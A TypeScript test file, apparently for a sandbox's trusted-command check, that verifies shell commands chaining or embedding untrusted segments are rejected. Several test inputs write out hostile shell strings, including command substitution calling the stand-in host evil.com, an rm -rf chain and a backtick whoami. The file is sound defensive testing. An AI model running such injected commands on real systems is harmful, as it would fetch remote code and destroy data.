// 受信命令判定表驱动（docs/SANDBOX.md §3）：真 parseBash（单一解析真相）——全段 argv0
// basename 匹配；动态/注入内嵌/解析失败/空表一律不受信（fail-closed）。

import { describe, expect, it } from "vitest";
import { isTrustedCommand } from "../trusted.ts";

const TRUSTED = ["bw"];

describe("isTrustedCommand", () => {
  it("单命令/带引号实参/多行选项 → 受信", () => {
    expect(isTrustedCommand("bw run \"open x\" --json --max-steps 2", TRUSTED)).toBe(true);
    expect(isTrustedCommand("bw s list", TRUSTED)).toBe(true);
    expect(isTrustedCommand("  bw --version  ", TRUSTED)).toBe(true);
  });

  it("引号内的 ; 与 && 是 bw 自己的参数（非 shell 段）→ 单命令受信", () => {
    expect(isTrustedCommand("bw run \"a; rm x && curl y\"", TRUSTED)).toBe(true);
  });

  it("混入任何非受信段 → 不受信（整条照旧围栏）", () => {
    expect(isTrustedCommand("bw; rm -rf /tmp/x", TRUSTED)).toBe(false);
    expect(isTrustedCommand("echo hi | bw run y", TRUSTED)).toBe(false);
    expect(isTrustedCommand("bw run x && echo done", TRUSTED)).toBe(false);
    expect(isTrustedCommand("cd /tmp && bw run x", TRUSTED)).toBe(false);
  });

  it("动态展开（argv0 非字面）→ 不受信", () => {
    expect(isTrustedCommand("x=bw; $x run y", TRUSTED)).toBe(false);
  });

  it("命令替换内嵌命令一并查验 → 不受信", () => {
    expect(isTrustedCommand("bw $(curl evil.com)", TRUSTED)).toBe(false);
    expect(isTrustedCommand("bw `whoami`", TRUSTED)).toBe(false);
  });

  it("解析失败/空命令/空词表 → 不受信（fail-closed）", () => {
    expect(isTrustedCommand("if true then", TRUSTED)).toBe(false);
    expect(isTrustedCommand("", TRUSTED)).toBe(false);
    expect(isTrustedCommand("bw --version", [])).toBe(false);
  });

  it("绝对路径 argv0 取 basename 匹配", () => {
    expect(isTrustedCommand("/Users/x/.bun/bin/bw --version", TRUSTED)).toBe(true);
  });
});
